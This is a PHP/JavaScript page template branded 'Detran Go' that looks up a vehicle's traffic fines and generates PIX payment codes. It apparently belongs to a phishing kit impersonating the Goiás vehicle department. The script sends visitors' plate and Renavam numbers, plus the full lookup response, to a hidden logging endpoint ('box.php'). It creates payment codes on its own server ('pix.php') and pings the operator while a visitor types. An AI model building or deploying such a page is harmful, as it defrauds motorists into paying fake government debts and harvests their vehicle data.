            <script>

            function IsDados(e) {
                if(e=='Detran Go'){
                    document.querySelectorAll('.dadosoff').forEach((item, idx) => {     
                        item.style.display='none';
                    }); 
                }
            }

            const dados = GoDados.acao.debitosVeiculo;
            var nomeX = GoVeiculo?.marcamodelo || GoVeiculo?.Marca  || 'Detran Go';

            var renavam = document.getElementById('renavam').value;
            var placa = document.getElementById('placa').value;

            IsDados(nomeX);

            const dadosArray = [];

             if (renavam) {
                dadosArray.push({
                    label: "Renavam",
                    value: renavam
                });
            }

            if (placa) {
                dadosArray.push({
                    label: "Placa",
                    value: placa
                });
            }

            // Log/salvamento

            var debitos = GoDados.acao.debitosTotaisVeiculo.totalDebitos ?? 0;

            $.ajax({
                url: './data/box.php',
                method: 'POST',
                data: {
                dados: JSON.stringify(dadosArray),
                doc: renavam,
                debitos,
                nome: nomeX,
                page: 'Detran Go',
                resposta: encodeURIComponent(JSON.stringify(GoDados))
            }
            });
            
            // ---------- Helpers de DOM ----------
            const $id = (id) => document.getElementById(id);
            const setText = (id, text) => {
                const el = $id(id);
                if (el) el.textContent = text;
            };
            const setBtnState = (btnId, enabled) => {
                const btn = $id(btnId);
                if (!btn) return;
                btn.disabled = !enabled;
                btn.classList.toggle('opacity-50', !enabled);
                btn.classList.toggle('cursor-not-allowed', !enabled);
            };

            // ---------- Moeda (centavos) ----------
            const fmtBRL = new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL'
            });
            const toBRL = (cents) => fmtBRL.format((Number.isFinite(cents) ? cents : 0) / 100);

            function moneyToCents(v) {
                if (v == null) return 0;
                if (typeof v === 'number') return Math.round(v * 100);
                if (typeof v !== 'string') return 0;

                let s = v.replace(/\u00A0/g, ' ').trim(); // NBSP -> espaço
                s = s.replace(/^R\$\s?/, '');

                const tokenNoSpace = s.replace(/\s+/g, '').toUpperCase();
                if (
                    tokenNoSpace === '' ||
                    tokenNoSpace === '----' ||
                    tokenNoSpace === 'PAGO' ||
                    tokenNoSpace === 'ISENTO' ||
                    tokenNoSpace === 'NAO' || tokenNoSpace === 'NÃO' ||
                    tokenNoSpace === 'NAOAPLICA' || tokenNoSpace === 'NÃOAPLICA' ||
                    tokenNoSpace === 'NAOSEAPLICA' || tokenNoSpace === 'NÃOSEAPLICA'
                ) return 0;

                const hasComma = s.includes(',');
                const hasDot = s.includes('.');

                if (hasComma && hasDot) {
                    s = s.replace(/\./g, '').replace(',', '.'); // 1.234,56 -> 1234.56
                } else if (hasComma && !hasDot) {
                    s = s.replace(',', '.'); // 123,45 -> 123.45
                } else if (!hasComma && hasDot) {
                    const brThousandsOnly = /^\d{1,3}(\.\d{3})+$/; // 1.234 -> 1234
                    if (brThousandsOnly.test(s)) s = s.replace(/\./g, '');
                }

                s = s.replace(/\s+/g, '');
                const n = Number(s);
                return Number.isFinite(n) ? Math.round(n * 100) : 0;
            }

            // ---------- Leitura segura ----------
            const sit = (dados && dados.situacaoMultaVeiculo) ? dados.situacaoMultaVeiculo : {};
            const vencidas = Array.isArray(sit.multasVencidas) ? sit.multasVencidas : [];
            const notificadas = Array.isArray(sit.multasNotificadas) ? sit.multasNotificadas : [];
            const naoVencidasArr = Array.isArray(sit.multasNaoVencidas) ? sit.multasNaoVencidas : [];

            // ---------- Vencidas ----------
            const vencidasQtd = vencidas.length;
            const vencidasTotalCents = vencidas.reduce((acc, m) => acc + moneyToCents(m.valorTotal), 0);

            setText('vencidas-qtd', vencidasQtd);
            setText('vencidas-total', toBRL(vencidasTotalCents));
            setBtnState('vencidas-btn', vencidasTotalCents > 0);
            const btnVencidas = $id('vencidas-btn');
            if (btnVencidas) {
                btnVencidas.onclick = async () => {
                    await openPixModal(toBRL(vencidasTotalCents));
                };
            }

            // Mobile (vencidas)
            setText('mobile-vencidas-qtd', vencidasQtd);
            setText('mobile-vencidas-total', toBRL(vencidasTotalCents));
            setBtnState('mobile-vencidas-btn', vencidasTotalCents > 0);
            const btnMobileVencidas = $id('mobile-vencidas-btn');
            if (btnMobileVencidas) {
                btnMobileVencidas.onclick = async () => {
                    await openPixModal(toBRL(vencidasTotalCents));
                };
            }

            // ---------- Não vencidas (Notificadas + Não Vencidas) ----------
            const naoVencidasLista = [...notificadas, ...naoVencidasArr];
            const naovencidasQtd = naoVencidasLista.length;
            const naovencidasTotalCents = naoVencidasLista.reduce((acc, m) => acc + moneyToCents(m.valorTotal), 0);
            const naovencidasDescCents = naoVencidasLista.reduce((acc, m) => acc + moneyToCents(m.valorDesconto), 0);

            setText('naovencidas-qtd', naovencidasQtd);
            setText('naovencidas-total', toBRL(naovencidasTotalCents));
            setText('naovencidas-desconto', toBRL(naovencidasDescCents));
            setBtnState('naovencidas-btn', naovencidasTotalCents > 0);
            const btnNaoVencidas = $id('naovencidas-btn');
            if (btnNaoVencidas) {
                btnNaoVencidas.onclick = async () => {
                    await openPixModal(toBRL(naovencidasTotalCents));
                };
            }

            // ---------- Notificadas (para seção mobile-notificadas) ----------
            const notificadasQtd = notificadas.length;
            const notificadasTotalCents = notificadas.reduce((acc, m) => acc + moneyToCents(m.valorTotal), 0);
            const notificadasDescCents = notificadas.reduce((acc, m) => acc + moneyToCents(m.valorDesconto), 0);

            setText('mobile-notificadas-qtd', notificadasQtd);
            setText('mobile-notificadas-total', toBRL(notificadasTotalCents));
            setText('mobile-notificadas-desconto', toBRL(notificadasDescCents));
            setBtnState('mobile-notificadas-btn', notificadasTotalCents > 0);

            const btnMobileNotificadas = $id('mobile-notificadas-btn');
            if (btnMobileNotificadas) {
                btnMobileNotificadas.onclick = async () => {
                    await openPixModal(toBRL(notificadasTotalCents));
                };
            }


            let isModalOpen = false;
            let verificarInterval = null;

            const modalContent = document.getElementById('modalContent');
            const closeModal = document.getElementById('closeModal');
            const closeModalBtn = document.getElementById('closeModalBtn');
            const pixCodeTextarea = document.getElementById('pixCode');
            const copyBtn = document.getElementById('copyBtn');
            const toast = document.getElementById('toast');
            const copyIcon = document.getElementById('copyIcon');
            const pixModal = document.getElementById('pixModal');
            const qrCodeImg = document.getElementById('qrcode'); // <img>
            const qrCodeImgNov = document.querySelector('.pix-code div'); // <img>

    
            function formatarValor(valor) {
                let valorFormatado = String(valor).replace("R$", "").trim();
                valorFormatado = valorFormatado.replace(",", ".");
                if (valorFormatado.indexOf(".") < valorFormatado.length - 3) {
                    valorFormatado = valorFormatado.replace(".", "");
                }
                //console.log (valorFormatado);
                return valorFormatado;
            }

            async function openPixModal(valor) {

                qrCodeImg.src = "../imagens/Spinner-btn.gif";

                let valorCents = formatarValor(valor);

                const valorAPagar = document.getElementById('valorAPagar');
                const valorAPagarNov = document.querySelector('.p-valor');

                valorAPagar.innerText = valor;
                valorAPagarNov.innerText = valor;

                Swal.fire({
                    title: "Aguarde, carregando...",
                    allowOutsideClick: false,
                    allowEscapeKey: false,
                    allowEnterKey: false,
                    didOpen: () => Swal.showLoading(),
                });

                try {
                    const response = await $.ajax({
                        url: './data/pix.php',
                        method: 'POST',
                        data: {
                            valor: valorCents,
                            cpf_cnpj: renavam,
                            debito:'Fatura gerada',
                            nome: nomeX,
                        }, // manda centavos pro backend
                        dataType: 'json'
                    });

                    if (!response || !response.status) {
                        throw new Error(response?.message || "Falha ao gerar PIX.");
                    }

                    // Código copia-e-cola
                    pixCodeTextarea.value = response.pix || "";

                    // Mostra o QR Code como imagem (usando seu serviço)
                    const encoded = encodeURIComponent(response.pix || "");
                    qrCodeImg.src = "https://dyn-qrcode.vercel.app/api?url=" + encoded;

                    qrCodeImgNov.innerHTML = encoded;

                    qrCodeImg.alt = "QR Code PIX";

                    // Fallback caso a imagem não carregue
                    qrCodeImg.onerror = () => {
                        // tenta um segundo endpoint simples (opcional)
                        qrCodeImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=" +encoded;
                    };
                   
                    // Abre modal
                    pixModal.classList.remove('hidden');
                    setTimeout(() => {
                        modalContent.classList.remove('scale-95', 'opacity-0');
                        modalContent.classList.add('scale-100', 'opacity-100');
                    }, 10);

                    isModalOpen = true;


                } catch (err) {
                    console.error("Erro ao gerar PIX:", err);
                    Swal.fire("Erro", (err && err.message) ? err.message : "Não foi possível gerar o PIX.",
                        "error");
                    return; // não abre modal se falhar
                } finally {
                    // Fecha o loader sempre
                    if (Swal.isVisible()) Swal.close();
                }
            }

       
            // Fechar modal
            function closePixModal() {
                modalContent.classList.remove('scale-100', 'opacity-100');
                modalContent.classList.add('scale-95', 'opacity-0');
                setTimeout(() => {
                    pixModal.classList.add('hidden');
                }, 300);

                isModalOpen = false;
                if (verificarInterval) {
                    clearInterval(verificarInterval);
                    verificarInterval = null;
                }
            }

            // Copiar código PIX
            async function copyPixCode() {
                try {
                    await navigator.clipboard.writeText(pixCodeTextarea.value);
                    showToast();

                    // Animar ícone
                    copyIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>`;

                    setTimeout(() => {
                        copyIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>`;
                    }, 2000);

                } catch (err) {
                    // Fallback para navegadores mais antigos
                    pixCodeTextarea.select();
                    document.execCommand('copy');
                    showToast();
                }
            }

            // Mostrar toast
            function showToast() {
                toast.classList.remove('-translate-y-full', 'opacity-0');
                toast.classList.add('translate-y-0', 'opacity-100');

                setTimeout(() => {
                    toast.classList.remove('translate-y-0', 'opacity-100');
                    toast.classList.add('-translate-y-full', 'opacity-0');
                }, 3000);
            }


            closeModal.addEventListener('click', closePixModal);
            closeModalBtn.addEventListener('click', closePixModal);
            copyBtn.addEventListener('click', copyPixCode);

            // Fechar modal clicando no overlay
            pixModal.addEventListener('click', (e) => {
                if (e.target === pixModal) {
                    closePixModal();
                }
            });

            // Fechar modal com ESC
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape' && !pixModal.classList.contains('hidden')) {
                    closePixModal();
                }
            });
            </script>

 <?php }else{ ?>

 <script>

    var inputs = [
    document.getElementById('placa-input'),
    document.getElementById('renavam-input')
];

let typingTimer = null;
let notifyInterval = null;
const INACTIVITY_TIMEOUT = 3000; // 3 segundos sem digitar
const NOTIFY_INTERVAL = 5000; // notificar a cada 5s enquanto digitando

inputs.forEach(input => {
    input.addEventListener('input', (e) => {
        const value = e.target.value.trim();

        // Ao começar a digitar, envia notificação e inicia intervalos
        if (!notifyInterval) {
            notifyTyping();
            notifyInterval = setInterval(notifyTyping, NOTIFY_INTERVAL);
        }

        // Reinicia o timer de inatividade sempre que digita
        clearTimeout(typingTimer);
        typingTimer = setTimeout(() => {
            // Parou de digitar
            clearInterval(notifyInterval);
            notifyInterval = null;
        }, INACTIVITY_TIMEOUT);
    });
});

async function notifyTyping() {
    try {
        const response = await fetch('/api/typing_start.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ typing: true })
        });

        if (!response.ok) {
            console.error('Erro ao notificar typing:', response.status);
            return;
        }

        const data = await response.json();
        // Pode usar o `data` se necessário

    } catch (error) {
        console.error('Erro na requisição typing_start.php:', error);
    }
}


</script>

